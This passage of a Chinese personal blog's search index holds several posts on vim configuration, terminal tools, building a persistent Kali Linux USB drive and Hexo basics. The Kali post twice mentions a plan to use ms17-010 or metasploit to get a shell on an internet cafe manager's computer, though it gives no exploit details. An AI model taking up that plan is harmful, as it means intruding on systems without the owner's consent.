g:ale_c_cppcheck_options = &#39;&#39;let g:ale_cpp_cppcheck_options = &#39;&#39;let g:ale_sign_error = &quot;&gt;&gt;&quot;let g:ale_sign_warning = &quot;--&quot;map &lt;F7&gt; ::ALEToggle&lt;CR&gt;&quot; 你的所有插件需要在下面这行之前call vundle#end()            &quot; 必须filetype plugin indent on    &quot; 必须，加载vim自带和插件相应的语法和文件类型相关脚本</code></pre><h4 id="配置解读"><a href="#配置解读" class="headerlink" title="配置解读"></a>配置解读</h4><h5 id="关于配色方案"><a href="#关于配色方案" class="headerlink" title="关于配色方案"></a>关于配色方案</h5><p>在我（或你）的<code>/usr/share/vim/vim80/colors/</code>目录，有着自带的一些配色方案，我选择的配色方案是 <font color="red"><code>desert</code></font> ，看下图；你还可以到网上找一些其他的配色方案来使用，前提是得将找来的配色方案文件放置在此目录下，请注意文件是 <font color="red"><code>.vim</code></font> 后缀。</p><p>如何设置配色方案？很简单，看上方配置文件的第 25 行（<font color="red">colorscheme desert</font>）。将 <font color="red"><code>desert</code></font> 替换为你喜欢的配色主题名，最后保存退出。</p><pre><code class="bash">$  cd /usr/share/vim/vim80/colors$  lsblue.vim      desert.vim    koehler.vim  peachpuff.vim  slate.vimdarkblue.vim  elflord.vim   morning.vim  README.txt     torte.vimdefault.vim   evening.vim   murphy.vim   ron.vim        zellner.vimdelek.vim     industry.vim  pablo.vim    shine.vim</code></pre><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fy584vv8ybj30yj0py7wh.jpg" <img src="/"></p><h5 id="文件头部信息"><a href="#文件头部信息" class="headerlink" title="文件头部信息"></a>文件头部信息</h5><p>每次新建一个 <em>Python</em> 文件，会自动生成下图所示的头部信息。</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fy58ursaobg30vr0oldoh.gif" <img src="/"></p><p>这里得在 <code>~/.vim/</code> 目录下创建一个存放模板文件的目录，目录名就叫 <code>vimTemplate</code> ，模板名取为 <code>pythonHeader</code> </p><pre><code class="bash">$ mkdir ~/.vim/vimTemplate &amp;&amp; vim pythonHeader</code></pre><p>将下面几行写入到模板文件 <code>pythonHeader</code> 之中</p><pre><code class="bash">#!/usr/bin/env python3# -*- coding:utf-8 -*-#File Name:#Created Time:</code></pre><p>生成头部的程序，也可看上方配置文件（从第 80 行开始往下看）</p><pre><code class="bash">&quot;auto add pyhton header --start 自动添加py文件头 autocmd BufNewFile *.py 0r ~/.vim/vimTemplate/pythonHeader  autocmd BufNewFile *.py ks|call FileName()|&#39;s  autocmd BufNewFile *.py ks|call CreatedTime()|&#39;s  fun FileName()      if line(&quot;$&quot;) &gt; 10        let l = 10  &quot;这里是字母L    else        let l =line(&quot;$&quot;)    endif    exe &quot;1,&quot;.l.&quot;g/File Name:.*/s/File Name:.*/File Name:&quot;.expand(&quot;%&quot;)&quot;最前面是数字1，这里的File Name:和模板中一致endfunfun CreatedTime()    if line(&quot;$&quot;) &gt; 10        let l=10    else        let l=line(&quot;$&quot;)    endif    exe &quot;1,&quot;.l.&quot;g/Created Time:.*/s/Created Time:.*/Created Time:&quot;.strftime(&quot;%Y-%m-%d %T&quot;)&quot;这里Create Time:要和模板中一致endfun&quot;auto add python header --end</code></pre><h5 id="Python-运行及代码缩进"><a href="#Python-运行及代码缩进" class="headerlink" title="Python 运行及代码缩进"></a>Python 运行及代码缩进</h5><pre><code class="bash">&quot;python运行配置map &lt;F10&gt; :w&lt;cr&gt;:!python3 %&lt;cr&gt;:q&lt;cr&gt;  &quot;按F10键进行python调试au BufNewFile,BufRead *.py &quot;设置py文件支持PEP8风格\ set tabstop=4r\ set softtabstop=4\ set shiftwidth=4\ set textwidth=79\ set expandtab\ set autoindent\ set fileformat=unix</code></pre><p>介于我的快捷键冲突，所以我将 <code>F10</code> 设置运行该 <em>Python</em> 文件（前提是得先保存）。</p><h5 id="代码语法检查"><a href="#代码语法检查" class="headerlink" title="代码语法检查"></a>代码语法检查</h5><p>前面安装的插件 <strong>ALE</strong> 以及 <strong>pylint</strong> ，现在可以对它们进行配置了。这里的缩进语法我已经配置好（仅限Python）。</p><pre><code class="bash">Plugin &#39;w0rp/ale&#39;&quot; 对应语言需要安装相应的检查工具&quot; https://github.com/w0rp/ale    let g:ale_linters_explicit = 1 &quot;除g:ale_linters指定，其他不可用    let g:ale_linters = &#123;\    &#39;python&#39;: [&#39;pylint&#39;]\&#125;&quot;\   &#39;cpp&#39;: [&#39;cppcheck&#39;,&#39;clang&#39;,&#39;gcc&#39;],&quot;\   &#39;c&#39;: [&#39;cppcheck&#39;,&#39;clang&#39;, &#39;gcc&#39;],&quot;\   &#39;bash&#39;: [&#39;shellcheck&#39;],&quot;\   &#39;go&#39;: [&#39;golint&#39;],let g:ale_sign_column_always = 1let g:ale_completion_delay = 500let g:ale_echo_delay = 20let g:ale_lint_delay = 500let g:ale_echo_msg_format = &#39;[%linter%] %code: %%s&#39;let g:ale_lint_on_text_changed = &#39;normal&#39;let g:ale_lint_on_insert_leave = 1let g:airline#extensions#ale#enabled = 1&quot;let g:ale_set_quickfix = 1&quot;let g:ale_open_list = 1&quot;打开quitfix对话框let g:ale_c_gcc_options = &#39;-Wall -O2 -std=c99&#39;let g:ale_cpp_gcc_options = &#39;-Wall -O2 -std=c++14&#39;let g:ale_c_cppcheck_options = &#39;&#39;let g:ale_cpp_cppcheck_options = &#39;&#39;let g:ale_sign_error = &quot;&gt;&gt;&quot;let g:ale_sign_warning = &quot;--&quot;map &lt;F7&gt; ::ALEToggle&lt;CR&gt;  &quot; 暂时关闭代码检查</code></pre><h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><ul><li>显示方面</li></ul><pre><code class="bash">&quot;显示相关&quot;set shortmess=atI  &quot;不显示帮助乌干达的提示colorscheme desert &quot;设置配色方案set showcmd &quot;输入的命令显示出来syntax on &quot;语法高亮set tabstop=4  &quot;Tab键的宽度设为４set softtabstop=4set shiftwidth=4  &quot;统一缩进为４set autoindent  &quot;开启自动缩进，保持缩进值与上一行相等autocmd InsertLeave * se nocul &quot;用浅色高亮当前行autocmd InsertEnter * se cul &quot;用浅色高亮当前行set ruler &quot;显示当前光标行列位置set mouse=a &quot;支持鼠标set laststatus=2 &quot;显示状态栏（默认值为１，无法显示状态栏)if has(&#39;gui_running&#39;)    set t_Co=256endifset guifont=Monoset autoread &quot;当文件在外部修改时，vim自动更新载入set ignorecase &quot;搜索时忽略大小写set foldmethod=syntaxset nofoldenable &quot;此两行为折叠代码</code></pre><ul><li>保存、括号、行数……</li></ul><pre><code class="bash">&quot;实现CTRL-w保存操作nnoremap &lt;C-w&gt; :w&lt;cr&gt;imap &lt;C-w&gt; &lt;Esc&gt;:w&lt;cr&gt;&quot;映射以F12打开NERDTreennoremap &lt;silent&gt; &lt;F12&gt; :NERDTree&lt;CR&gt;&quot;映射自动补全括号inoremap ( ()&lt;ESC&gt;iinoremap [ []&lt;ESC&gt;iinoremap &#123; &#123;&#125;&lt;ESC&gt;iinoremap &quot; &quot;&quot;&lt;ESC&gt;iinoremap &#39; &#39;&#39;&lt;ESC&gt;iset encoding=utf-8set fenc=utf-8set fencs=utf-8,usc-bom,euc-jp,gb18030,gbk,gb2312,cp936,big-5set enc=utf-8let &amp;termencoding=&amp;encodingset nu                        &quot; 显示行数set nocompatible              &quot; 必须，加载vim自带和插件相应的语法和文件类型相关脚本filetype off                  &quot; 必须set list listchars=tab:&gt;-,trail:-,eol:$  &quot;设定tab键显示为&gt;-,每行行尾显示$set report=0</code></pre><p>…………</p><p>差不多就这些吧，这些也就仅仅入门/坑。以后有空再慢慢折腾吧！</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vim </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于Terminal的一些技巧</title>
      <link href="2018/12/01/%E5%85%B3%E4%BA%8E-Terminal-%E7%9A%84%E4%B8%80%E4%BA%9B%E9%AA%9A%E6%93%8D%E4%BD%9C/"/>
      <url>2018/12/01/%E5%85%B3%E4%BA%8E-Terminal-%E7%9A%84%E4%B8%80%E4%BA%9B%E9%AA%9A%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<blockquote><p>关于 Terminal 窗口、字体大小以及背景透明度，请自行选择合适方案。</p><p>关于那些除了装逼的 Terminal 特效，我就不提了。（譬如好莱坞😎）</p></blockquote><h4 id="关于终端模拟器"><a href="#关于终端模拟器" class="headerlink" title="关于终端模拟器"></a>关于终端模拟器</h4><p>其实在图形化上使用的都不算是真真正正的终端，算终端模拟器；真正的终端其实是最小化安装系统的那个黑界面。</p><span id="more"></span><p>而 Ubuntu 上自带终端模拟器其实并不怎样，而在应用商店有一个 Terminator（终结者）还算不错。</p><p>可去 Ubuntu Software 点击下载，也可使用命令安装；</p><pre><code class="shell">$ sudo apt install terminator</code></pre><p>还有一个叫做 Tilix，本人目前就在使用。</p><h4 id="关于shell主题"><a href="#关于shell主题" class="headerlink" title="关于shell主题"></a>关于shell主题</h4><p>我使用的 <em>shell</em> 主题名为 <a href="https://github.com/EliverLara/Sweet">Sweet</a> ，如下图所示</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fxr5lbdklqj315o0vyjz2.jpg" <img src="/"></p><h4>关于字体</h4>另外，我使用的为一款优秀的开源字体 [Hack](https://github.com/source-foundry/Hack) ，如下图![](http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fxr5lp2x90j31jk14sjs4.jpg)<h3>0x00 彩虹喵lolcat</h3>这玩意儿是一个将你在终端输入命令后，显示的文本颜色修改为彩虹色，还是比较漂亮的。仓库地址：https://github.com/busyloop/lolcat<h4>安装</h4>首先，安装 **git** 和 **gem**：```zsh$ sudo apt install git gem```其次，克隆 **lolcat** 仓库：```zsh$ cd /opt && sudo git clone https://github.com/busyloop/lolcat.git```最后使用 **gem** 安装 **lolcat**：```zsh$ cd /opt/lolcat/bin$ gem install lolcat```![](http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fxr5mhtcckj30s40m41kx.jpg)<h4>使用</h4>使用方法很简单，即在你要执行的命令后面加上它，譬如```zsh$ cat /proc/cpuinfo | lolcat```<h3>0x01 neofetch显示系统Info</h3>这条命令可以个性化地显示当前系统的一些信息，比较酷……<h4>安装</h4>```zsh$ sudo apt install neofetch```<h4>使用（附图）</h4>```zsh$ neofetch```![](http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fxr5mus4zwj30sh0kv1kx.jpg)<h3>0x02 fish shell</h3>> 一个友好、互动的命令行shell。>官网：http://fishshell.com/> Github仓库：https://github.com/fish-shell/fish-shell<h4>安装</h4>```zsh$ sudo apt install fish```<h4>使用</h4>如果你是短期使用的话，则可以直接在终端输入命令```zsh$ fish```如果你喜欢它，想长期，则应该右击你的终端窗口，选择 <font color="red">`配置文件首选项`</font> （英文就是 <font color="red">`Preferences`</font> ）。然后在上方栏选择 <font color="red">`命令`</font> 或者 <font color="red">`Command`</font> ，勾上第二行，并在其下方输入 <font color="red">`/usr/bin/fish`</font> 。如下图所示：![](http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fxr5nuf82ij30nb0k7jsj.jpg)<h3>0x03 oh-my-zsh美化</h3>> 说起 *oh-my-zsh* ，必须得提 *zsh* ，和上面的 *fish* 以及系统默认的 *bash* ，均属同一类型。也就是说，这三者只能选其一。而我选择的就是 **zsh** ，搭配 **oh-my-zsh** 美化。官网：https://ohmyz.sh/Github仓库：https://github.com/robbyrussell/oh-my-zsh<h4>快速开始</h4>此前得预先安装 *zsh*```zsh$ sudo apt install zsh```然后安装 *wget* 或者 *curl* ，以及必须的 *git*```zsh$ sudo apt install wget curl git```<h4>安装</h4>最后使用 *wget* 或者 *curl* 来安装 *oh-my-zsh* （两者二选一）```zsh$ sh -c "$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)"``````zsh$ sh -c "$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"```<h4>美化配置</h4><h5>插件</h5>首先，标准的一些插件可在 <font color="red">`~/.oh-my-zsh/plugins/`</font> ，这个目录下找到。其次，自定义的插件，你应该添加到 <font color="red">`~/.oh-my-zsh/custom/plugins/`</font> 目录。最后 ，配置文件```zsh$ vi ~/.zshrc```找到类似与下面这串字符，添加在括号之中。（每一个插件应单独占一行）```bashplugins=(  git  sudo  z  pip  autojump  zsh-syntax-highlighting  zsh-autosuggestions  battery  extract  git-extras)```<h5>主题</h5>编辑配置文件```zsh$ vi ~/.zshrc```找到 <font color="red">`ZSH_THEME`</font> 选项，将你喜欢的主题名替换双引号之中的。譬如，我喜欢随机主题，那么就应该是这个样子。```zshZSH_THEME="random"```保存并退出。<h3>0x04 Byobu</h3>> 一个窗口管理器和终端多路复用器；>> 以及终端窗口下方的一排系统监视器。官网：http://byobu.orgGithub仓库：https://github.com/dustinkirkland/byobu<h4>安装</h4>```zsh$ sudo apt install byobu```<h4>快捷键</h4>- F1 - 配置菜单- F2 - 添加一个窗口- F3 - 移至左边窗口- F4 - 移至右边窗口- ……其他，具体看配置菜单中的 **help** ……![](http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fxr5ofu2apj30sh0k875y.jpg)<img src=" class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fxr5orn6mbj30s60m5tbx.jpg" /"/><h4>关联oh-my-zsh</h4>配合 *oh-my-zsh* 一起使用会更完美，首先编辑一个配置文件```shell$ vi $HOME/.byobu/.tmux.conf```然后将以下内容写入此配置文件中```shellset -g default-shell /usr/bin/zshset -g default-command /usr/bin/zsh```保存并退出，完毕！<h4>永久使用</h4>还是和上面的 **fish** 一样，右击你的终端窗口，选择 <font color="red">`配置文件首选项`</font> （英文就是 <font color="red">`Preferences`</font> ）。然后在上方栏选择 <font color="red">`命令`</font> 或者 <font color="red">`Command`</font> ，勾上第二行，并在其下方输入 <font color="red">`/usr/bin/byobu`</font> 。如下图所示：![](http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fxr5n969xoj30nb0k7t9v.jpg)<h4>一件小事</h4>使用了 **byobu** ，但你右击终端右（左）上角的关闭按钮，其实终端并没有关闭。它还在后台运行着，这时你想真真正正地去关闭它，得使用命令去关闭。```shell$ exit```<h3 id="会话恢复"><a href="#会话恢复" class="headerlink" title="会话恢复"></a>会话恢复</h3><p>一款一般是在服务器上用的会话恢复工具<code>screen</code>。</p><p>一般滴，ssh 连上服务器后，由于某种原因（例如无故断网），不仅会断开与服务器的连接，还会连先前在服务器上运行的程序都可能会断开。</p><p>这时候就需要一款会话恢复工具：</p><pre><code class="bash">$ screen python -m SimpleHTTPServer 8080</code></pre><p>先查看 Detached 的回话：</p><pre><code class="bash">$ screen -lsThere is a screen on:    13231.ttys001.Hakintos    (Detached)1 Socket in /var/folders/75/nc22t8d13cg32cnp4gj5zf340000gn/T/.screen.</code></pre><p>恢复：</p><pre><code class="bash">$ screen -r ttys001.HakintosServing HTTP on 0.0.0.0 port 8080 ...127.0.0.1 - - [14/Mar/2020 20:37:37] &quot;GET / HTTP/1.1&quot; 200 -</code></pre><p>这个工具还有更多高级玩法，不过目前我还用不上。</p><h3 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h3><p>还有很多 Linux 终端上好用的工具：</p><ul><li>htop（top增强版）</li><li>bat（高级cat）</li><li><a href="https://github.com/junegunn/fzf">mycli</a>（mysql命令补全）</li><li><a href="https://github.com/tmux/tmux">tmux</a>（终端复用，类似screen）</li><li><a href="https://github.com/junegunn/fzf">fzf</a>（找文件）</li><li><a href="https://github.com/ranger/ranger">rander</a>（终端文件管理）</li><li><a href="https://github.com/ogham/exa">exa</a>（高级ls）</li><li><a href="https://github.com/sharkdp/fd">fd</a>（find替代品）</li><li><a href="https://github.com/BurntSushi/ripgrep">ripgrep</a>（grep替代品）</li><li><a href="https://github.com/asciinema/asciinema">asciinema</a>（终端录屏回放）</li><li>……</li></ul><p>真是比运维还运维！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> Terminal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>便携式Kali Linux创建</title>
      <link href="2018/11/10/%E4%BE%BF%E6%90%BA%E5%BC%8FKali-Linux%E5%88%9B%E5%BB%BA/"/>
      <url>2018/11/10/%E4%BE%BF%E6%90%BA%E5%BC%8FKali-Linux%E5%88%9B%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>我的想法就是，首先将一系统装入U盘或者移动硬盘；然后在其他计算机上也可使用；再然后我想不妨网吧走一遭、试一试，美滋滋；最后，ms17-010拿到网管机子的shell（此招本文不会涉及）！！！<br>当然，也不一定可行，如果某电脑开启了BIOS锁（不过就我看来这种情况较少），就不行了；其次，在网吧这样也蛮危险！！！</p><p>废话不多说……</p><span id="more"></span><h3 id="0x00-此前准备"><a href="#0x00-此前准备" class="headerlink" title="0x00 此前准备"></a>0x00 此前准备</h3><ul><li><p>Kali Linux ISO 镜像文件（<a href="cdimage.kali.org/kali-2018.4/kali-linux-2018.4-amd64.iso">下载</a>）</p></li><li><p>Rufus（<a href="https://github.com/pbatard/rufus/releases/download/v3.3/rufus-3.3.exe">下载</a>）</p></li><li><p>一台 Windows 操作系统的电脑</p></li><li><p>U盘或移动硬盘　　</p></li></ul><p>说明：此文所安装的Kali Linux非live，而是持久性的。</p><p>本人Kali镜像包：kali-linux-2018.4-amd64.iso。Rufus只能安装在Windows上使用；U盘或移动硬盘自行准备，U盘建议3.0以上（本人金士顿3.0 64G依然卡），遂改用非SSD移动硬盘，当然SSD会更好。</p><h3 id="0x01-刻录镜像"><a href="#0x01-刻录镜像" class="headerlink" title="0x01 刻录镜像"></a>0x01 刻录镜像</h3><p>首先，打开安装好了的Rufus；如果是U盘，那么在设备项会自动识别U盘设备；如果是移动硬盘，应先勾上显示USB外置硬盘才能识别移动硬盘设备。下一步，在引导类型选择中选择Kali镜像。再下一步，选择NTFS的文件系统；其他选择项默认就行，可以点击开始了。</p><p>一图概括：</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fx313qf0lrj30xq0p2q97.jpg" <img src="/"></p><p>然后，就会出现下面这种情况，选择第二项：</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fx31rb3qgrj30yg0o7446.jpg" <img src="/"></p><p>再然后，直接点击确认：</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fx31sz9fm4j30wr0oan2i.jpg" <img src="/"></p><p>最后，看到如下状态，等会儿：</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fx31t968xaj30vr0otdl4.jpg" <img src="/"></p><p>至此，视窗上的操作已完成……</p><h3 id="0x02-启动项选择"><a href="#0x02-启动项选择" class="headerlink" title="0x02 启动项选择"></a>0x02 启动项选择</h3><p>接着上面的继续来……<br>首先，重启你的操作系统。在此过程中，不停的敲击键盘上左上角的 <strong>Esc</strong> 按键（请注意，此刻手速得快）。</p><p>之后，你就会看到如下界面：</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fx325y7qhfj33402c0dq6.jpg" <img src="/"></p><p>选择UEFI项回车，如上图</p><p>然后，就进入到了Kali live的一些模式选择，如下图：</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fx3296vhcpj33402c0u0x.jpg" <img src="/"></p><p>此处，我选择的是第四项，<strong>persistence</strong> 持久化；而第五项 <strong>encrypted persistence</strong> 则是加密持久化。回车……</p><h3 id="0x03-创建持久化Kali（重点）"><a href="#0x03-创建持久化Kali（重点）" class="headerlink" title="0x03 创建持久化Kali（重点）"></a>0x03 创建持久化Kali（重点）</h3><p>经过漫长等待，终于进入到桌面。</p><p>打开终端，先查看一下磁盘信息：</p><pre><code class="shell"># fdisk -l</code></pre><p>如下图，得到如下信息，简单概括为：</p><ul><li><p><code>sdc</code> 为我的移动硬盘（你的不一定是 <code>sdc</code> ，看实际大小）</p></li><li><p>931.5G大小</p></li></ul><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fx32hnayklj31hc0u0tkp.jpg" <img src="/"></p><p>分区了，为了数据安全，此处一定要注意，你的不一定是 <code>sdc</code> ，可能是 <code>sdb</code> 或者其他</p><pre><code class="shell"># fdisk /dev/sdc</code></pre><p><code>/dev/sdc</code> 即为我的移动硬盘，此命令即对我的移动硬盘进行分区</p><pre><code class="shell">Command (m for help):nPartition type:  p   primary  e   extended</code></pre><p>回车后，先输入 <code>n</code> 即代表 <code>new</code> 新建一个分区，回车出现以上提示：</p><ul><li><p>p 　primary   (主分区)</p></li><li><p>e 　extended  (扩展分区)</p></li></ul><p>输入 <code>p</code> （默认主分区，或直接）回车，选择主分区：</p><pre><code class="shell">Select (default p):p</code></pre><p>分区号和第一扇区默认，直接回车：</p><pre><code class="shell">Partition number（3,4 default 3）：First sector（6131712-1953525167, default 6131712）:</code></pre><p><code>Last sector</code> 这里就是设置此分区的总大小，我勉强给300G：</p><pre><code class="shell">Last sector, +sector or +size&#123;K,M,G,T,P&#125;(6131712-1953525167, default 1953525167): +300GCreated a new partition 3 of type &#39;Linux&#39; and of size 300 GiB.</code></pre><p>最后，输入 <code>w</code> 保存：</p><pre><code class="shell">Command (m for help): wThe partition table has been altered.Syncing disks.</code></pre><p>至此，分区完毕。</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fx32oyputhj31hc0u0tla.jpg" <img src="/"></p><p>这时，<code>lsblk</code> 可以查看一下，<br>然后给刚刚分的区设置文件系统及创建持久化设置，如下图：</p><pre><code class="shell"># lsblk# mkfs.ext4 -L persistence /dev/sdc3# e2label /dev/sdc3 persistence</code></pre><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fx32pnm0quj31hc0u0k4d.jpg" <img src="/"></p><p>到这儿，快结束了……</p><ol><li>创建挂载点<pre><code class="shell"># mkdir -p /mnt/disk</code></pre></li><li>挂载 (<code>mount</code>)<pre><code class="shell"># mount /dev/sdc3 /mnt/disk</code></pre></li><li>写入持久化配置文件<pre><code class="shell"># echo &quot;/ union&quot; &gt; /mnt/disk/persistence.conf</code></pre></li><li>卸载（<code>umount</code>）<pre><code class="shell"># umount /mnt/disk</code></pre></li><li>重启（<code>reboot</code>）<pre><code class="shell"># reboot -i</code></pre> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fx32pwbt91j31hc0u0k3i.jpg" <img src="/"></li></ol><h3 id="0x04-最后"><a href="#0x04-最后" class="headerlink" title="0x04 最后"></a>0x04 最后</h3><p>请注意：</p><p>重启后，还是和上面进入启动项一样，选择第二项：</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fx325y7qhfj33402c0dq6.jpg" <img src="/"></p><p>这里还是选择第四项 <code>persistence</code> :</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fx3296vhcpj33402c0u0x.jpg" <img src="/"></p><p>至此，持久化Kali创建完毕咯……</p><p>可能还有后话哦（<del><code>metasploit</code> 拿网管主机shell</del>）……</p><h3 id="未完待续……"><a href="#未完待续……" class="headerlink" title="未完待续……"></a>未完待续……</h3>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo基本使用</title>
      <link href="2018/10/10/hello-world/"/>
      <url>2018/10/10/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><span id="more"></span><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/deployment.html">Deployment</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Blog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
